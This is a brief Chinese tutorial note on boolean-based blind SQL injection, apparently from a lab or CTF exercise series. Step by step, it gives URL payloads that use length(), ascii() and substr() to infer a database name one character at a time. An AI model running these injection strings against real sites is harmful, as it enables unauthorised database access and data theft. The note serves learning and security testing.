# 布尔盲注

适用于页面只有真值、假值两种情况。手工布尔盲注费时费力。

1. 先判断闭合方式/页面的真假性：and 1=1, and 1=2

2. ```
   ?id=1' and length((select database())) > 9 --+
   ```

3. 通过调整参数得知 select database() 返回值的长度

4. ```
   ?id=1' and ascii((select database())) > 100 --+
   ```

5. 通过调整参数得知 database 的第一个字符的 ascii 码值

6. 利用 substr 选择查看其他位置上的字母（substr() 和 substring() 没有区别，下标从1开始）

7. ```
   ?id=1' and ascii(substr((select database()),2,1)) > 100 --+
   ```

8. 依此类推重复之前题目的方法